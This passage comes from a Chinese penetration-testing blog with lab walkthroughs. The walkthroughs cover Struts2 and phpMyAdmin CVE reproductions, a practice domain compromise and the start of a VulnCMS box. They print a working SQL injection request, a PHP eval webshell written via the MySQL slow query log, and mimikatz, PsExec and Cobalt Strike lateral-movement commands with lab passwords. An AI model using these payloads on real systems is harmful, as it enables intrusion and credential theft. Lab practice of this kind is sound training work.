&lt;h1 id=&#34;漏洞描述&#34;&gt;&lt;a href=&#34;#漏洞描述&#34; class=&#34;headerlink&#34; title=&#34;漏洞描述&#34;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;CVE(CAN) ID: CVE-2013-1966&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Struts2 是第二代基于Model-View-Controller (MVC)模型的java企业级web应用框架。它是WebWork和Struts社区合并后的产物。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url/a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;复现地址:&lt;a href=&#34;http://vulfocus.fofa.so/&#34;&gt;http://vulfocus.fofa.so/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;漏洞复现&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021144502977.png&#34; alt=&#34;image-20211021144502977&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问首页，点击”s:a”tag   &lt;a href=&#34;http://118.193.36.37:48931/link.action&#34;&gt;http://118.193.36.37:48931/link.action&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;直接使用Exp吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021144618353.png&#34; alt=&#34;image-20211021144618353&#34;&gt;&lt;/p&gt;

 &lt;h1 id=&#34;phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;a href=&#34;#phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34; class=&#34;headerlink&#34; title=&#34;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;/a&gt;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&lt;/h1&gt;&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 5.00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 4.94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;复现地址:&lt;a href=&#34;http://vulfocus.fofa.so/&#34;&gt;http://vulfocus.fofa.so/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141143985.png&#34; alt=&#34;image-20211021141143985&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到环境使用给出的账号密码进入后台，开启Burpsuite抓包，获取到一个token，保存下来&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141220287.png&#34; alt=&#34;image-20211021141220287&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接将请求的地址替换成poc即可。poc如下，记得需要替换token&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;server_privileges.php?ajax_request=true&amp;amp;validate_username=1&amp;amp;username=1&amp;#x27;and extractvalue(1,concat(0x7e,(select user()),0x7e))--+db=&amp;amp;token=3c7c5b2b7f3a7621394d6c733e35705f&amp;amp;viewing_mode=server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141407302.png&#34; alt=&#34;image-20211021141407302&#34;&gt;&lt;/p&gt;

 &lt;h1 id=&#34;信息搜集&#34;&gt;&lt;a href=&#34;#信息搜集&#34; class=&#34;headerlink&#34; title=&#34;信息搜集&#34;&gt;&lt;/a&gt;信息搜集&lt;/h1&gt;&lt;p&gt;namp扫描，发现存在80,3306端口&lt;/p&gt;
&lt;p&gt;gobuster扫描，发现存在phpmyadmin和一个phpinfo.php&lt;/p&gt;
&lt;p&gt;这里就一步带过了，实战的话没有这么简单&lt;/p&gt;
&lt;h1 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h1&gt;&lt;h2 id=&#34;非预期解&#34;&gt;&lt;a href=&#34;#非预期解&#34; class=&#34;headerlink&#34; title=&#34;非预期解&#34;&gt;&lt;/a&gt;非预期解&lt;/h2&gt;&lt;p&gt;首页是一个探针，我发现了一个检测mysql的地方，随便一输账号密码root|root发现检测成功，这就拿到mysql弱口令了。。&lt;/p&gt;
&lt;p&gt;root|root登陆phpmyadmin,尝试直接select into outfile写shell，失败了select @@global.secure_file_priv发现是null&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211013205628649.png&#34; alt=&#34;image-20211013205628649&#34;&gt;&lt;/p&gt;
&lt;p&gt;不急，就算这样也可以绕过secure_file_priv，具体可以看&lt;a href=&#34;https://www.cnblogs.com/c1e4r/articles/8902444.html&#34;&gt;https://www.cnblogs.com/c1e4r/articles/8902444.html&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;设置slow_query_log=1.即启用慢查询日志(默认禁用)。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set global slow_query_log=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set global slow_query_log_file=&amp;#x27;dir\filename&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.向日志文件写入shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php @eval($_POST[1]);?&amp;gt;&amp;#x27; or sleep(10);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里的网站的绝对路径我们不知道，可以去phpinfo.php下查看，发现是C:/phpStudy/WWW &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211013210033844.png&#34; alt=&#34;image-20211013210033844&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里直接蚁剑连接，发现他还有个cms，这里到后面我才发现，预期解应该是通过CMS来获取shell的。&lt;/p&gt;
&lt;h1 id=&#34;内网搜集&#34;&gt;&lt;a href=&#34;#内网搜集&#34; class=&#34;headerlink&#34; title=&#34;内网搜集&#34;&gt;&lt;/a&gt;内网搜集&lt;/h1&gt;&lt;h2 id=&#34;域信息搜集&#34;&gt;&lt;a href=&#34;#域信息搜集&#34; class=&#34;headerlink&#34; title=&#34;域信息搜集&#34;&gt;&lt;/a&gt;域信息搜集&lt;/h2&gt;&lt;p&gt;蚁剑终端输入ipconfig /all，发现存在另外一个ip 192.168.52.143，又发现存在域god.org&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;net group /domain  #查看域内所有用户列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net group “domain computers” /domain #查看域成员计算机列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net group “domain admins” /domain #查看域管理员用户&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里我们选择用CS生成一个木马来进行上线，我这里MSF联动CS了，可以使用蚁剑，拿到shell以后就是administrator权限&lt;/p&gt;
&lt;p&gt;我们这里尝试getsystem，然后getuid，直接是system权限了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016111321916.png&#34; alt=&#34;image-20211016111321916&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到会话以后，我们继续搜集一下域信息，发现当前ip是192.168.52.143，他应该是两个网卡，这是内网ip&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell ipconfig /all   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell net config workstation  查看是否有域，以及当前域&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell net user /domain      查看域内所有用户列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell net group &amp;quot;domain computers&amp;quot; /domain  查看域成员计算机列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell net group &amp;quot;domain admins&amp;quot; /domain  查看域管理员用户&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016111751142.png&#34; alt=&#34;image-20211016111751142&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016111941693.png&#34; alt=&#34;image-20211016111941693&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们这里在CS中也可以使用一下hashdump抓取一下密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016112339847.png&#34; alt=&#34;image-20211016112339847&#34;&gt;&lt;/p&gt;
&lt;p&gt;再用mimikatz抓一下密码，得到当前用户登录密码为hongrisec@2019&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016112517349.png&#34; alt=&#34;image-20211016112517349&#34;&gt;&lt;/p&gt;
&lt;p&gt;回到MSF，拿到meterpreter以后收集一下补丁信息以及安装的软件信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_patches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_applications&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211013223113253.png&#34; alt=&#34;image-20211013223113253&#34;&gt;&lt;/p&gt;
&lt;p&gt;这台机子还有nmap，可以直接拿来让我们使用   &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell nmap -sn 192.168.52.0/24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211013224700291.png&#34; alt=&#34;image-20211013224700291&#34;&gt;&lt;/p&gt;
&lt;p&gt;存活了三台，分别是138  141 143，我们可以知道当前这台是143，所以分别使用nmap对138 141进行扫描&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell nmap -sV -sC -A --script=vuln 192.168.52.141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell nmap -sV -sC -A --script=vuln 192.168.52.138&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里可以发现域成员主机存在&lt;code&gt;MS08-067&lt;/code&gt;和&lt;code&gt;MS17-010&lt;/code&gt;漏洞，但是由于一些原因，打不通&lt;/p&gt;
&lt;h1 id=&#34;横向移动&#34;&gt;&lt;a href=&#34;#横向移动&#34; class=&#34;headerlink&#34; title=&#34;横向移动&#34;&gt;&lt;/a&gt;横向移动&lt;/h1&gt;&lt;h2 id=&#34;socks隧道搭建&#34;&gt;&lt;a href=&#34;#socks隧道搭建&#34; class=&#34;headerlink&#34; title=&#34;socks隧道搭建&#34;&gt;&lt;/a&gt;socks隧道搭建&lt;/h2&gt;&lt;p&gt;这里我们使用MSF里自带的socks4a来建立隧道(MSF6里与MSF5的貌似不同了)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run get_local_subnets   #查看路由信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -s 192.168.52.0/24    #添加一条路由&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -p  #查看路由信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/server/socks_proxy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set VERSION 4a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set SRVHOST 192.168.100.206&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211013231218116.png&#34; alt=&#34;image-20211013231218116&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;哈希传递&#34;&gt;&lt;a href=&#34;#哈希传递&#34; class=&#34;headerlink&#34; title=&#34;哈希传递&#34;&gt;&lt;/a&gt;哈希传递&lt;/h2&gt;&lt;p&gt;计算机中的认证，不是根据原始密码认证，而是根据密文认证的。而通过传递密文成功登录就是哈希传递。&lt;/p&gt;
&lt;p&gt;用win7这台机器中转一个监听器：&lt;/p&gt;
&lt;p&gt;将生成的木马文件和PsExec.exe上传到win7主机，远程登录win7主机执行：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:\PsExec64.exe -accepteula \\192.168.52.138 -u administrator -p cjlusec@123456 -d -c C:\beacon1.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;传到了域控主机但是没能执行，建立ipc管道，用psexec.exe连接cmd, 最后直接拿到域控&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;net use \\192.168.52.138\ipc$ &amp;quot;cjlusec@123456&amp;quot; /user:god\administrator&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211015183516256.png&#34; alt=&#34;image-20211015183516256&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;坑:这里拿到域控的CMD以后本应该运行我们的木马上线CS，但是我这里不管怎么样那个木马一运行就停止工作，所以这里我们选择在CS上来进行操作&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们这里直接在CS上使用SOCKS代理 ，然后我们创建一个SMB的监听器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016113418880.png&#34; alt=&#34;image-20211016113418880&#34;&gt;&lt;/p&gt;
&lt;p&gt;来到目标界面，导入内网的两台192.168.52.138  192.168.52.141 ，右键选择psexec，使用刚刚新建的SMB监听器，&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016113706225.png&#34; alt=&#34;image-20211016113706225&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016121524294.png&#34; alt=&#34;image-20211016121524294&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211016121544556.png&#34; alt=&#34;image-20211016121544556&#34;&gt;&lt;/p&gt;
&lt;p&gt;即可获取到域成员的一个会话，在选择用户名密码的时候需要选择Administrator的账号密码，同样的方法上线域控主机即可&lt;/p&gt;
&lt;h1 id=&#34;战果图&#34;&gt;&lt;a href=&#34;#战果图&#34; class=&#34;headerlink&#34; title=&#34;战果图&#34;&gt;&lt;/a&gt;战果图&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/Snipaste_2021-10-15_23-28-36.png&#34; alt=&#34;Snipaste_2021-10-15_23-28-36&#34;&gt;&lt;/p&gt;
&lt;p&gt;😁🤞🤞🤞🤞🌹🌹🌹&lt;/p&gt;

 &lt;h1 id=&#34;vulnhub靶机练习-VULNCMS&#34;&gt;&lt;a href=&#34;#vulnhub靶机练习-VULNCMS&#34; class=&#34;headerlink&#34; title=&#34;vulnhub靶机练习-VULNCMS&#34;&gt;&lt;/a&gt;vulnhub靶机练习-VULNCMS&lt;/h1&gt;&lt;p&gt;靶机下载地址：&lt;a href=&#34;https://www.vulnhub.com/entry/vulncms-1,710/&#34;&gt;https://www.vulnhub.com/entry/vulncms-1,710/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;Description&#34;&gt;&lt;a href=&#34;#Description&#34; class=&#34;headerlink&#34; title=&#34;Description&#34;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;This box is all about CMS as its name suggests. You need to enumerate the box, find the CMS, and exploit in order to gain access to other and finally get the user and root flag.&lt;/p&gt;
&lt;p&gt;Hint: Proceed in the given order :P&lt;/p&gt;
&lt;h2 id=&#34;信息搜集&#34;&gt;&lt;a href=&#34;#信息搜集&#34; class=&#34;headerlink&#34; title=&#34;信息搜集&#34;&gt;&lt;/a&gt;信息搜集&lt;/h2&gt;&lt;p&gt;nmap -sV -sC -A 192.168.169.143  发现开放了22 80 5000  8081 9001端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210824110046652.png&#34; alt=&#34;image-20210824110046652&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中80是w3.css   5000端口是WordPress  8081端口是Joomla  9001端口是drupal，经过测试，9001端口的下的drupal可以利用&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;这里drupal有个RCE，我直接丢上Exp了&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span 